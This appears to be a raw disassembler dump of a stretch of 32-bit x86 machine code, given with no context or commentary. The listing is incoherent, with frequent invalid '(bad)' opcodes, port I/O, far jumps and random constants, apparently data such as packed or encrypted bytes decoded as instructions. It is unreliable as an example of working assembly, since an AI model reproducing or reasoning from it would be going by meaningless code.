  41d09b:	fsub   st(6),st
  41d09d:	inc    ebp
  41d09e:	ja     0x41d0ce
  41d0a0:	call   0xa8a7fd2f
  41d0a5:	daa    
  41d0a6:	mov    db2,edi
  41d0a9:	sbb    al,0xc6
  41d0ab:	imul   ecx,DWORD PTR [eax-0x45c73464],0x6f423cc7
  41d0b5:	aad    0x2d
  41d0b7:	push   edx
  41d0b8:	das    
  41d0b9:	adc    DWORD PTR [ecx-0x58],ebx
  41d0bc:	jl     0x41d0ba
  41d0be:	xor    al,0xdc
  41d0c0:	outs   dx,DWORD PTR ds:[esi]
  41d0c1:	mov    al,0xf6
  41d0c3:	(bad)  
  41d0c4:	ds mov edi,0x7359cd0
  41d0ca:	dec    edi
  41d0cb:	test   al,0x85
  41d0cd:	arpl   WORD PTR ds:0xab1b8e4c,bx
  41d0d3:	retf   
  41d0d4:	aas    
  41d0d5:	jmp    0x16b6e5a7
  41d0da:	mov    cl,0x20
  41d0dc:	mov    WORD PTR [ecx-0x3e],cs
  41d0df:	cmp    DWORD PTR [ebx-0x68],edi
  41d0e2:	int3   
  41d0e3:	dec    esp
  41d0e4:	out    0xd2,eax
  41d0e6:	inc    edx
  41d0e7:	xor    BYTE PTR [esi-0x26ed38da],dh
  41d0ed:	pop    esi
  41d0ee:	inc    edi
  41d0ef:	mov    DWORD PTR [ebx+0x5d],esp
  41d0f2:	jecxz  0x41d0d9
  41d0f4:	xchg   edi,eax
  41d0f6:	xchg   edx,eax
  41d0f7:	inc    esi
  41d0f8:	cmp    eax,0x86a45565
  41d0fd:	loopne 0x41d177
  41d0ff:	jb     0x41d151
  41d101:	in     al,dx
  41d102:	loop   0x41d10e
  41d104:	push   es
  41d105:	clc    
  41d106:	mov    eax,ds:0x37474ce5
  41d10b:	aas    
  41d10c:	push   ss
  41d10d:	mov    bh,0x44
  41d10f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d110:	add    al,BYTE PTR [ebp+0x1b]
  41d113:	mov    ds:0x3bf592c8,eax
  41d118:	fwait
  41d119:	mov    dl,0xd7
  41d11b:	fidiv  DWORD PTR [edi]
  41d11d:	ja     0x41d158
  41d11f:	add    BYTE PTR [ecx-0x4d],dh
  41d122:	fnstsw ax
  41d124:	ins    BYTE PTR es:[edi],dx
  41d125:	xor    edi,ecx
  41d127:	push   esi
  41d128:	sahf   
  41d129:	js     0x41d192
  41d12b:	dec    eax
  41d12c:	in     eax,0x61
  41d12e:	aam    0xb5
  41d130:	int3   
  41d131:	jmp    FWORD PTR [edi+esi*2-0x6b14eae8]
  41d138:	inc    ebp
  41d139:	cld    
  41d13a:	cmc    
  41d13b:	fst    QWORD PTR [ecx+0x71]
  41d13e:	jle    0x41d0e3
  41d140:	cmp    dh,dl
  41d142:	pop    ecx
  41d143:	cld    
  41d144:	and    bh,BYTE PTR [eax+esi*1+0x513d275a]
  41d14b:	add    ebp,eax
  41d14d:	ficom  WORD PTR [ecx]
  41d14f:	jle    0x41d158
  41d151:	es stos DWORD PTR es:[edi],eax
  41d153:	shl    DWORD PTR [esi-0x39370e10],1
  41d159:	add    BYTE PTR [ebp-0x2fafa1d9],dl
  41d15f:	pop    ebp
  41d160:	sbb    esp,DWORD PTR [eax-0x11]
  41d163:	ds popf 
  41d165:	xor    eax,DWORD PTR [esi]
  41d167:	inc    edx
  41d168:	inc    edx
  41d169:	call   0xa18c:0x6c6a068b
  41d170:	or     ah,dh
  41d172:	lods   al,BYTE PTR ds:[esi]
  41d173:	cmp    eax,0xfa687797
  41d178:	cmp    BYTE PTR [ebp+0x7a03b68c],ah
  41d17e:	sbb    edi,ecx
  41d180:	inc    edx
  41d181:	call   0x6bb609f5
  41d186:	cmp    bh,al
  41d188:	adc    al,0x20
  41d18a:	in     al,dx
  41d18b:	or     esi,DWORD PTR [ebp+0x281025ab]
  41d191:	xchg   edi,eax
  41d192:	mov    ch,0x7d
  41d194:	pop    ss
  41d195:	mov    fs:0x58b0baa5,eax
  41d19b:	lods   eax,DWORD PTR ds:[esi]
  41d19c:	adc    esp,DWORD PTR [edi+0x6d29e7fd]
  41d1a2:	les    edi,FWORD PTR [edi]
  41d1a4:	in     eax,dx
  41d1a5:	test   DWORD PTR [edx-0x73],0x1eb662a5
  41d1ac:	jg     0x41d13c
  41d1ae:	xor    BYTE PTR [ebp-0x77],cl
  41d1b1:	js     0x41d133
  41d1b3:	cmp    eax,0xed866ff1
  41d1b8:	daa    
  41d1b9:	dec    ecx
  41d1ba:	data16 int 0xe7
  41d1bd:	js     0x41d15f
  41d1bf:	out    dx,ax
  41d1c1:	jg     0x41d19e
  41d1c3:	sub    eax,0x9ecb4a02
  41d1c8:	lods   al,BYTE PTR ds:[esi]
  41d1c9:	fistp  WORD PTR fs:[eax]
  41d1cc:	mov    al,0xdc
  41d1ce:	scas   eax,DWORD PTR es:[edi]
  41d1cf:	inc    ebx
  41d1d0:	into   
  41d1d1:	icebp  
  41d1d2:	xlat   BYTE PTR ds:[ebx]
  41d1d3:	dec    edx
  41d1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1d5:	adc    edi,esp
  41d1d7:	adc    eax,0x28276b0b
  41d1dc:	icebp  
  41d1dd:	xchg   edi,eax
  41d1de:	pushf  
  41d1df:	rcr    dl,1
  41d1e1:	ja     0x41d183
  41d1e3:	das    
  41d1e4:	xchg   esp,eax
  41d1e5:	push   ss
  41d1e6:	and    cl,bl
  41d1e8:	rcr    DWORD PTR [edx-0x75],cl
  41d1eb:	in     al,0x84
  41d1ed:	mov    al,BYTE PTR [edi+0x389a084f]
  41d1f3:	andps  xmm7,XMMWORD PTR [esi]
  41d1f6:	int3   
  41d1f7:	inc    eax
  41d1f8:	scas   eax,DWORD PTR es:[edi]
  41d1f9:	mov    cl,0xdc
  41d1fb:	ja     0x41d18e
  41d1fd:	push   edx
  41d1fe:	out    dx,al
  41d1ff:	or     bl,BYTE PTR [esi-0x50]
  41d202:	repnz sub al,0x41
  41d205:	in     al,dx
  41d206:	dec    edx
  41d207:	outs   dx,DWORD PTR ds:[esi]
  41d208:	mov    ?,edx
  41d20a:	push   esi
  41d20b:	jge    0x41d248
  41d20d:	aaa    
  41d20e:	jnp    0x41d258
  41d210:	jae    0x41d1ab
  41d212:	add    BYTE PTR [edx-0x41],bh
  41d215:	not    BYTE PTR [esi+0x6f]
  41d218:	lods   eax,DWORD PTR ds:[esi]
  41d219:	aaa    
  41d21a:	or     ebp,edx
  41d21c:	outs   dx,BYTE PTR ds:[esi]
  41d21d:	mov    esi,0x4d7a297d
  41d222:	fcmovb st,st(7)
  41d224:	pop    ss
  41d225:	ret    0xb18e
  41d228:	sub    bh,BYTE PTR [edx-0x7be20b89]
  41d22e:	aaa    
  41d22f:	pop    ss
  41d230:	and    eax,0x11bfee24
  41d235:	shl    BYTE PTR [ebx+0x778740a0],0xaf
  41d23c:	aam    0xea
  41d23e:	sub    eax,0xecebbfdf
  41d243:	cmp    DWORD PTR [ebx-0x1db82f0f],0x94b70eab
  41d24d:	adc    BYTE PTR [esi+0x1f],al
  41d250:	mov    ds:0x3371502f,al
  41d255:	iret   
  41d256:	dec    eax
  41d257:	jmp    0x41d285
  41d259:	sub    DWORD PTR [eax-0x4f],0x7b79d176
  41d260:	and    al,0x3d
  41d262:	stos   DWORD PTR es:[edi],eax
  41d263:	es das 
  41d265:	mov    bl,bh
  41d267:	add    al,0xe2
  41d269:	mov    eax,ds:0x3ebb0e72
  41d26e:	fcmovnbe st,st(2)
  41d270:	pusha  
  41d271:	xchg   edi,eax
  41d272:	les    ebp,FWORD PTR [edi]
  41d274:	daa    
  41d275:	xchg   edi,eax
  41d276:	and    edi,esp
  41d278:	repz sub DWORD PTR [ecx+0x7d],0xda29c471
  41d280:	(bad)  
  41d281:	in     al,0x59
  41d283:	fmul   DWORD PTR [ebx]
  41d285:	jbe    0x41d2e9
  41d287:	mov    ecx,0xb021b4d8
  41d28c:	mov    ds:0x9c12369d,al
  41d291:	icebp  
  41d292:	and    ebp,0xffffffe8
  41d295:	pop    esp
  41d296:	loopne 0x41d2da
  41d298:	mov    esi,0x7c988a85
  41d29d:	mov    esi,0x82e5fc8f
  41d2a2:	jns    0x41d25f
  41d2a4:	inc    ebp
  41d2a5:	lods   eax,DWORD PTR ds:[esi]
  41d2a6:	sbb    al,BYTE PTR ds:0xdb657785
  41d2ac:	add    al,0xfc
  41d2ae:	sbb    DWORD PTR ds:0xf37c9cdf,esi
  41d2b4:	add    edi,DWORD PTR [edx]
  41d2b6:	and    al,0xaa
  41d2b8:	sbb    al,0x82
  41d2ba:	jno    0x41d24a
  41d2bc:	pinsrw mm4,WORD PTR [esi+eiz*1],0x63
  41d2c1:	loopne 0x41d260
  41d2c3:	int    0x70
  41d2c5:	je     0x41d301
  41d2c7:	fcmovnb st,st(3)
  41d2c9:	out    dx,al
  41d2ca:	jb     0x41d2b8
  41d2cc:	add    BYTE PTR [esi+0x38b91eb5],0xdd
  41d2d3:	(bad)  
  41d2d4:	pop    edx
  41d2d5:	sbb    ch,BYTE PTR [edx+esi*2-0x2d65a081]
  41d2dc:	xchg   esp,eax
  41d2dd:	adc    al,ah
  41d2df:	pop    ebp
  41d2e0:	cmp    esp,esp
  41d2e2:	adc    BYTE PTR ds:0xae1386a3,cl
  41d2e8:	int3   
  41d2e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2ea:	push   es
  41d2eb:	push   edi
  41d2ec:	sti    
  41d2ed:	fwait
  41d2ee:	mov    ds:0x859bbd23,eax
  41d2f3:	test   eax,0x93437194
  41d2f8:	mov    ebx,0xb98cf73
  41d2fd:	outs   dx,BYTE PTR ds:[esi]
  41d2fe:	push   esp
  41d2ff:	push   ebp
  41d300:	mov    esi,0xabef9be6
  41d305:	pusha  
  41d306:	adc    BYTE PTR [ebx+0x8cc6d93],ah
  41d30c:	test   BYTE PTR [edx-0x48],0x99
  41d310:	retf   
  41d311:	call   0x6af49450
  41d316:	jmp    0xe8d:0x9202cc65
  41d31d:	add    DWORD PTR [ebp-0x19691361],eax
  41d323:	and    al,0xf5
  41d325:	inc    ebx
  41d326:	xchg   DWORD PTR [edx-0x16],eax
  41d329:	xlat   BYTE PTR ds:[ebx]
  41d32a:	dec    eax
  41d32b:	pop    es
  41d32c:	lock xor bh,bl
  41d32f:	pop    ebp
  41d330:	cmp    eax,0x2b1ee12f
  41d335:	and    edi,esi
  41d337:	test   cl,ch
  41d339:	fs cmp ebp,edx
  41d33c:	retf   0xfc22
  41d33f:	test   eax,0x77eed0e7
  41d344:	inc    esi
  41d345:	fdivr  DWORD PTR [edi+ebp*1+0x714d8b3b]
  41d34c:	cdq    
  41d34d:	mov    edx,0x11b7265b
  41d352:	mov    esi,0xa76c32c5
  41d357:	jno    0x41d35e
  41d359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d35a:	into   
  41d35b:	sub    eax,0x57d229d8
  41d360:	cmc    
  41d361:	sub    BYTE PTR [eax-0x2518aca3],bh
  41d367:	or     esp,DWORD PTR [ebp+0x951ae32]
  41d36d:	(bad)  
  41d36e:	mov    ds:0x738adfa2,eax
  41d373:	mov    ds:0x96252d8b,eax
  41d378:	rcl    DWORD PTR [edi+0x74],cl
  41d37b:	out    0x7f,al
  41d37d:	js     0x41d36f
  41d37f:	jno    0x41d39e
  41d381:	jne    0x41d3fc
  41d383:	test   al,0x39
  41d385:	jg     0x41d353
  41d387:	(bad)  
  41d389:	xor    eax,0x17e7d7d6
  41d38e:	daa    
  41d38f:	ret    
  41d390:	stc    
  41d391:	xchg   ebx,eax
  41d392:	mov    ecx,0xea5e55d8
  41d397:	mov    edi,edi
  41d399:	sub    ebp,esi
  41d39b:	push   cs
  41d39c:	and    ch,BYTE PTR [edi]
  41d39e:	fadd   DWORD PTR [ebx+0x253e0157]
  41d3a4:	jnp    0x41d366
  41d3a6:	adc    dh,cl
  41d3a8:	cmp    al,0xe2
  41d3aa:	(bad)  
  41d3ab:	mov    ch,0xb9
  41d3ad:	xchg   ebx,eax
  41d3ae:	inc    ebp
  41d3af:	cli    
  41d3b0:	jge    0x41d413
  41d3b2:	adc    ch,BYTE PTR [ecx+0x34]
  41d3b5:	icebp  
  41d3b6:	and    dl,BYTE PTR [eax]
  41d3b8:	out    0xae,al
  41d3ba:	mov    al,0x75
  41d3bc:	pop    edi
  41d3bd:	inc    ebp
  41d3be:	fidivr WORD PTR [ebx-0x48df046c]
  41d3c4:	rcr    BYTE PTR [ebx-0x7d],0x46
  41d3c8:	mov    ecx,0xf63c2e6d
  41d3cd:	cwde   
  41d3ce:	fucomi st,st(4)
  41d3d0:	xchg   DWORD PTR [ecx],ebp
  41d3d2:	sahf   
  41d3d3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41d3d5:	add    BYTE PTR [esi-0x1227f407],0xd8
  41d3dc:	inc    ebp
  41d3dd:	jecxz  0x41d39f
  41d3df:	mov    DWORD PTR [esi-0x1a],0x564c108b
  41d3e6:	push   ebx
  41d3e7:	jmp    0xc2aa656b
  41d3ec:	mov    cl,0xa5
  41d3ee:	sub    DWORD PTR [edi+0x70027157],esp
  41d3f4:	inc    ebp
  41d3f5:	lock jmp 0xc3845584
  41d3fb:	push   cs
  41d3fc:	sbb    edx,esp
  41d3fe:	stos   DWORD PTR es:[edi],eax
  41d3ff:	xlat   BYTE PTR ds:[ebx]
  41d401:	lds    esi,FWORD PTR [esp+esi*8]
  41d404:	shl    DWORD PTR [ecx+0x222c782a],0x39
  41d40b:	test   DWORD PTR [ebp+0x34],0xd8a05b42
  41d412:	pop    esi
  41d413:	add    al,0x4f
  41d415:	shl    BYTE PTR [ecx],0x25
  41d418:	mov    dl,0xfa
  41d41a:	jo     0x41d46a
  41d41c:	loope  0x41d3f2
  41d41e:	outs   dx,BYTE PTR ds:[esi]
  41d41f:	mov    bl,0x47
  41d421:	retf   0x6552
  41d424:	jb     0x41d3ad
  41d426:	shl    DWORD PTR [edx+0x7b078bb1],cl
  41d42c:	aam    0xbb
  41d42e:	and    DWORD PTR [ebp+0x5b06b512],ebx
  41d434:	sub    DWORD PTR [esi],ebx
  41d436:	outs   dx,DWORD PTR ds:[esi]
  41d437:	rcr    BYTE PTR [ebx+edx*1-0x22],cl
  41d43b:	mov    bl,0x10
  41d43d:	arpl   WORD PTR [ebp+0x58bfff52],cx
  41d443:	jnp    0x41d469
  41d445:	out    dx,al
  41d446:	mov    cl,0xa6
  41d448:	xlat   BYTE PTR ds:[ebx]
  41d449:	mov    ds:0x297abcbd,eax
  41d44e:	inc    edi
  41d44f:	bts    DWORD PTR [edi+edi*2-0x378fab56],edx
  41d457:	adc    bh,dl
  41d459:	jmp    0x6d7f:0x6a0fe543
  41d460:	gs add al,0x54
  41d463:	jno    0x41d449
  41d465:	mov    ds:0x8578a032,al
  41d46a:	mov    dh,BYTE PTR [ecx]
  41d46c:	mov    cl,BYTE PTR [ebp+0x68]
  41d46f:	add    ebx,DWORD PTR [ebp-0x6b]
  41d472:	fcomp  QWORD PTR [edx+0x3676c86c]
  41d478:	xor    eax,0x287aedb6
  41d47d:	and    DWORD PTR [eax-0x1],edx
  41d480:	test   al,0xfa
  41d482:	adc    esi,ecx
  41d484:	adc    ch,BYTE PTR [esi+0x74]
  41d487:	sbb    al,0xe1
  41d489:	test   eax,0xe3deb707
  41d48e:	stc    
  41d48f:	not    BYTE PTR [esi+0x34abcc71]
  41d495:	sbb    eax,0xc866331a
  41d49a:	or     esp,edi
  41d49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d49d:	gs cs je 0x41d4ea
  41d4a1:	test   al,0xd4
  41d4a3:	push   ecx
  41d4a4:	or     al,0xdf
  41d4a6:	mov    dl,0xcf
  41d4a8:	push   ecx
  41d4a9:	mov    al,ds:0xda80193b
  41d4ae:	adc    al,BYTE PTR [ebx+0x18c0631d]
  41d4b4:	add    bh,BYTE PTR [ebp+0x1b]
  41d4b7:	shr    edi,0xc6
  41d4ba:	bnd jne 0x41d49d
  41d4bd:	enter  0x7cc1,0x87
  41d4c1:	mov    WORD PTR [edi+0x4d],gs
  41d4c4:	aam    0xd7
  41d4c6:	in     al,0x18
  41d4c8:	pop    eax
  41d4c9:	inc    edi
  41d4ca:	(bad)  
  41d4cc:	fisttp QWORD PTR [esi]
  41d4ce:	mov    ds:0x33c0316,eax
  41d4d3:	(bad)  
  41d4d4:	es pop eax
  41d4d6:	jb     0x41d465
  41d4d8:	mov    ebp,ds
  41d4da:	rol    esi,0x4
  41d4dd:	fwait
  41d4de:	push   es
  41d4df:	dec    edx
  41d4e0:	push   ds
  41d4e1:	push   edx
  41d4e2:	xor    bh,BYTE PTR [edx-0x49]
  41d4e5:	xor    eax,0x9edd52bb
  41d4ea:	ds imul eax,edx,0x46b0e84a
  41d4f1:	mov    edx,0x980ae1d
  41d4f6:	cmp    cl,bh
  41d4f8:	out    dx,al
  41d4f9:	imul   ebp,ecx,0xc20bde6b
  41d4ff:	(bad)  
  41d500:	and    esi,DWORD PTR [ecx+0x75]
  41d503:	push   es
  41d504:	jp     0x41d4f4
  41d506:	sub    cl,BYTE PTR [esi-0x2dfd42d2]
  41d50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d50d:	push   edi
  41d50e:	stos   BYTE PTR es:[edi],al
  41d50f:	mov    ebp,0x9a44d76e
  41d514:	pop    eax
  41d515:	and    eax,0xb7788e31
  41d51a:	jbe    0x41d589
  41d51c:	lea    esi,[edi-0x530fa871]
  41d522:	neg    esp
  41d524:	cmp    BYTE PTR [ecx-0x21],cl
  41d527:	cmp    ch,BYTE PTR [edi+eax*1+0x6a1efe41]
  41d52e:	mov    al,ds:0xd4143312
  41d533:	outs   dx,BYTE PTR ds:[esi]
  41d534:	fstp   DWORD PTR es:[edx+0x3d]
  41d538:	lods   al,BYTE PTR ds:[esi]
  41d539:	jecxz  0x41d5a5
  41d53b:	push   0x10
  41d53d:	std    
  41d53e:	pop    ecx
  41d53f:	jae    0x41d562
  41d541:	out    0x7c,eax
  41d543:	jge    0x41d4fb
  41d545:	gs dec edi
  41d547:	test   edx,0x56046889
  41d54d:	les    esi,FWORD PTR [ebx-0xa02dfc8]
  41d553:	int    0x0
  41d555:	das    
  41d556:	inc    ecx
  41d557:	dec    sp
  41d559:	or     eax,ebx
  41d55b:	and    dh,BYTE PTR [edx+0x1b74b96c]
  41d561:	xor    eax,0xbacd3e02
  41d566:	mov    al,0x53
  41d568:	daa    
  41d569:	add    edi,DWORD PTR [edi+ebx*8-0x60406637]
  41d570:	ins    DWORD PTR es:[edi],dx
  41d571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d572:	or     ah,BYTE PTR [esi-0x3d]
  41d575:	int3   
  41d576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d577:	scas   al,BYTE PTR es:[edi]
  41d578:	call   0xa1fb:0x5845d14c
  41d57f:	sub    eax,0x12261f2d
  41d584:	dec    esp
  41d585:	inc    esp
  41d586:	push   ebx
  41d587:	sbb    al,0x40
  41d589:	loope  0x41d50e
  41d58b:	aas    
  41d58c:	xor    ecx,DWORD PTR [ecx+0x782b6c90]
  41d592:	shl    DWORD PTR [ecx],0x79
  41d595:	pop    eax
  41d596:	xchg   esi,eax
  41d597:	push   ss
  41d598:	in     al,0xfc
  41d59a:	or     al,0xea
  41d59c:	out    0x1,eax
  41d59e:	inc    esp
  41d59f:	cmp    al,0xa2
  41d5a1:	add    ebx,DWORD PTR [eax]
  41d5a3:	jp     0x41d5ea
  41d5a5:	and    BYTE PTR [edi+edx*8+0xe83fca9],dl
  41d5ac:	mov    ecx,0xcb299758
  41d5b1:	(bad)  
  41d5b2:	cwde   
  41d5b3:	add    ebx,0x406e2978
  41d5b9:	ret    0x82d1
  41d5bc:	xchg   BYTE PTR [edx-0x3ada3778],dh
  41d5c2:	mov    dh,0x59
  41d5c4:	sub    ch,BYTE PTR [ebp+0x2a3c4d33]
  41d5ca:	in     eax,dx
  41d5cb:	aam    0x7e
  41d5cd:	retf   
  41d5ce:	mov    BYTE PTR [esi],bl
  41d5d0:	pop    edi
  41d5d1:	and    BYTE PTR [esi-0x76],ch
  41d5d4:	dec    ebp
  41d5d5:	push   edx
  41d5d6:	test   eax,0xdff2541f
  41d5db:	push   0xffffffb6
  41d5dd:	sub    BYTE PTR [esi+0x75],dh
  41d5e0:	fsubr  QWORD PTR [edi-0x3]
  41d5e3:	and    dl,ah
  41d5e5:	int3   
  41d5e6:	xchg   DWORD PTR ds:0x2ba4c3b2,eax
  41d5ec:	xor    DWORD PTR [ebp-0x55],0x4
  41d5f0:	mov    ebx,0xf9be6171
  41d5f5:	idiv   DWORD PTR [eax+ebp*4]
  41d5f8:	mul    DWORD PTR [edi+esi*2+0x6bbd6a36]
  41d5ff:	sub    DWORD PTR [ecx],0xd32e6e9e
  41d605:	mov    ss,edi
  41d607:	sub    esi,DWORD PTR [ecx]
  41d609:	(bad)  
  41d60a:	cwde   
  41d60b:	cld    
  41d60c:	sbb    ecx,eax
  41d60e:	ficom  WORD PTR [esi+0x4a]
  41d611:	or     al,0xa1
  41d613:	mov    ds:0xf245d48f,eax
  41d618:	(bad)  [eax+eax*8]
  41d61b:	ins    DWORD PTR es:[edi],dx
  41d61c:	mov    BYTE PTR [edx-0x57],ch
  41d61f:	sub    esp,esp
  41d621:	xor    eax,0x8298390d
  41d626:	jl     0x41d60e
  41d628:	in     al,0x9f
  41d62a:	cmc    
  41d62b:	lock sar edi,cl
  41d62e:	xor    BYTE PTR [ecx+ecx*2+0x349b2caf],ch
  41d635:	inc    ebx
  41d636:	xor    ah,BYTE PTR [ebx+0x2d]
  41d639:	ds cmp ecx,ebx
  41d63c:	retf   
  41d63d:	pop    ecx
  41d63e:	mov    eax,ds:0xadb4d16e
  41d643:	push   ds
  41d644:	and    ebp,DWORD PTR [edx]
  41d646:	dec    esp
  41d647:	mov    ah,0x23
  41d649:	bound  esp,QWORD PTR [edi+eiz*2+0x32d5ada4]
  41d650:	leave  
  41d651:	(bad)  
  41d652:	std    
  41d653:	ret    
  41d654:	lods   eax,DWORD PTR ds:[esi]
  41d655:	mov    ebp,0xa3d780c6
  41d65a:	push   cs
  41d65b:	push   cs
  41d65c:	jns    0x41d61e
  41d65e:	ret    
  41d65f:	rcl    bh,0x9d
  41d662:	neg    BYTE PTR [edx+0x1d9a4f28]
  41d668:	sub    DWORD PTR [bx+0x38],0xffffff8f
  41d66d:	jne    0x41d6d3
  41d66f:	rcr    DWORD PTR [esi],cl
  41d671:	fwait
  41d672:	aam    0xbf
  41d674:	cmc    
  41d675:	xchg   ecx,eax
  41d676:	pop    ds
  41d677:	retf   
  41d678:	pop    ds
  41d679:	(bad)  
  41d67a:	or     ah,ah
  41d67c:	push   ebp
  41d67d:	out    dx,eax
  41d67e:	mov    ds:0x6f7e31c5,al
  41d683:	inc    eax
  41d684:	imul   ebp,DWORD PTR ds:0xe5f51cdd,0xffffffd9
  41d68b:	mov    eax,0x9255e305
  41d690:	(bad)  
  41d691:	and    edx,ecx
  41d693:	dec    esi
  41d694:	lock mov BYTE PTR [ebp+0x72],ch
  41d698:	jg     0x41d69c
  41d69a:	xor    al,0x84
  41d69c:	mov    bh,0x40
  41d69e:	sbb    ebx,DWORD PTR [edi-0x51]
  41d6a1:	mov    edi,0x21cdf6ea
  41d6a6:	or     BYTE PTR [eax+0x70],0xdf
  41d6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6ab:	pop    ss
  41d6ac:	push   es
  41d6ad:	pusha  
  41d6ae:	jnp    0x41d663
  41d6b0:	fcom   QWORD PTR ds:0x2f4aabc8
  41d6b6:	(bad)  
  41d6b7:	sub    al,BYTE PTR [esp+edi*4]
  41d6ba:	add    eax,0x10cb3aa3
  41d6bf:	imul   edi,DWORD PTR [edi+0x2d],0x18
  41d6c3:	sti    
  41d6c4:	fwait
  41d6c5:	cmp    eax,0xfa1c4c24
  41d6ca:	sub    ecx,0xbee028a6
  41d6d0:	pushf  
  41d6d1:	dec    edx
  41d6d2:	jle    0x41d689
  41d6d4:	rol    BYTE PTR [edi+0x69],1
  41d6d7:	mov    ds:0xd2949946,al
  41d6dc:	in     al,dx
  41d6dd:	clc    
  41d6de:	mov    ss:0xde116d26,eax
  41d6e4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6e6:	xor    al,0x6c
  41d6e8:	xlat   BYTE PTR ds:[ebx]
  41d6e9:	pop    esi
  41d6ea:	fcmovnb st,st(3)
  41d6ec:	test   al,0xcd
  41d6ee:	jne    0x41d765
  41d6f0:	mov    BYTE PTR [ebx],dl
  41d6f2:	push   esi
  41d6f3:	ror    esi,cl
  41d6f5:	aas    
  41d6f6:	ja     0x41d6ca
  41d6f8:	pop    ebp
  41d6f9:	sub    edi,eax
  41d6fb:	xchg   ebp,eax
  41d6fc:	std    
  41d6fd:	imul   ebx,DWORD PTR [edi+edx*4+0x55f6179],0x47535980
  41d708:	imul   edx,DWORD PTR [esi+0x17],0x98b541ba
  41d70f:	ret    0x9c10
  41d712:	idiv   BYTE PTR [ecx+ecx*4+0x1fc4420a]
  41d719:	pop    edi
  41d71a:	and    al,0xa
  41d71c:	jecxz  0x41d6bc
  41d71e:	popa   
  41d71f:	mov    ds,edi
  41d721:	cmp    esp,DWORD PTR [ecx+0x61]
  41d724:	loop   0x41d6b8
  41d726:	sbb    eax,0x2264e30c
  41d72b:	es add edi,ebp
  41d72e:	dec    edi
  41d72f:	mov    esp,0x1a72f3b2
  41d734:	add    eax,0x4fc63ba6
  41d739:	xchg   ecx,eax
  41d73a:	and    al,0x2b
  41d73c:	dec    edx
  41d73d:	push   es
  41d73e:	push   edx
  41d73f:	dec    ebp
  41d740:	lds    edi,FWORD PTR [edi+0x28]
  41d743:	mov    WORD PTR [esi+0xf2b1a4d],?
  41d749:	aad    0xfd
  41d74b:	pop    es
  41d74c:	mov    al,ds:0x8d84ab79
  41d751:	sub    DWORD PTR ds:0x5dbe522d,esi
  41d757:	push   edi
  41d758:	xor    al,0xcf
  41d75a:	sbb    DWORD PTR [ecx+0x6d2372e4],ebx
  41d760:	stos   BYTE PTR es:[edi],al
  41d761:	jg     0x41d70c
  41d763:	mov    edi,DWORD PTR [eax+eiz*2]
  41d766:	ja     0x41d753
  41d768:	sub    eax,0x1ef305de
  41d76d:	ins    BYTE PTR es:[edi],dx
  41d76e:	push   cs
  41d76f:	push   es
  41d770:	sbb    al,BYTE PTR [edi]
  41d772:	adc    al,0x1d
  41d774:	pop    edx
  41d775:	ds test ch,ch
  41d778:	pushf  
  41d779:	retf   0x32e4
  41d77c:	sbb    eax,eax
  41d77e:	push   ebx
  41d77f:	jae    0x41d70c
  41d781:	dec    ebx
  41d782:	jbe    0x41d72a
  41d784:	mov    dl,0xb8
  41d786:	xchg   esp,eax
  41d787:	add    al,0xb7
  41d789:	rol    ch,0x24
  41d78c:	mov    esi,0x8dc35ad1
  41d791:	sub    BYTE PTR gs:[ebp+0x43bf5c55],bl
  41d798:	(bad)
  41d79b:	inc    esi
  41d79c:	cs stc 
  41d79e:	or     BYTE PTR [esi],ah
  41d7a0:	add    ecx,esi
  41d7a2:	leave  
  41d7a3:	inc    ecx
  41d7a4:	dec    edi
  41d7a5:	jl     0x41d784
  41d7a7:	int    0x8f
  41d7a9:	jmp    0x41d79b
  41d7ab:	test   BYTE PTR [eax+ecx*1+0x5a],dl
  41d7af:	ja     0x41d789
  41d7b1:	out    0xc8,al
  41d7b3:	adc    ch,BYTE PTR [ecx]
  41d7b5:	inc    ebp
  41d7b6:	in     al,0xbb
  41d7b8:	add    al,0x0
  41d7ba:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7bc:	addr16 out 0xf3,al
  41d7bf:	data16 out 0xdb,al
  41d7c2:	popf   
  41d7c3:	push   eax
  41d7c4:	loope  0x41d778
  41d7c6:	ds call 0xb74ed6d7
  41d7cc:	mov    ebx,DWORD PTR [ebx]
  41d7ce:	push   ecx
  41d7cf:	sbb    al,0x8a
  41d7d1:	shl    ebx,0xe1
  41d7d4:	sbb    al,0x1f
  41d7d6:	in     eax,dx
  41d7d7:	test   esi,esp
  41d7d9:	and    eax,0x594c3f48
  41d7de:	lds    eax,FWORD PTR [ecx-0xf]
  41d7e1:	pop    esp
  41d7e2:	xor    BYTE PTR [ebx],ch
  41d7e4:	js     0x41d821
  41d7e6:	aaa    
  41d7e7:	dec    esi
  41d7e8:	(bad)  
  41d7e9:	mov    DWORD PTR [ecx-0xb32fb9b],esp
  41d7ef:	inc    edi
  41d7f0:	pop    edx
  41d7f1:	stc    
  41d7f2:	push   edx
  41d7f3:	jecxz  0x41d7c4
  41d7f5:	mov    ebx,0x3351aa98
  41d7fa:	and    eax,0x9c463649
  41d7ff:	jbe    0x41d871
  41d801:	fwait
  41d802:	xchg   esp,eax
  41d803:	xchg   ecx,eax
  41d804:	ds inc ebx
  41d806:	xchg   edi,eax
  41d807:	mov    ebx,0xfe2b0ef1
  41d80c:	imul   eax,DWORD PTR ds:0xb520f97,0x7d640d13
  41d816:	sub    esi,DWORD PTR ds:0x273b3d2b
  41d81c:	test   esp,ebx
  41d81e:	pop    ebp
  41d81f:	xor    BYTE PTR [eax],al
  41d821:	mov    ds:0xc1dc1ca,eax
  41d826:	je     0x41d7c0
  41d828:	mov    eax,ds:0xa4f00d8d
  41d82d:	scas   al,BYTE PTR es:[edi]
  41d82e:	mov    WORD PTR [edx+0x477ead79],?
  41d834:	and    BYTE PTR [edi+0x6570ade],0x6d
  41d83b:	and    eax,0x2070edcf
  41d840:	and    DWORD PTR [ecx+0x2e],esp
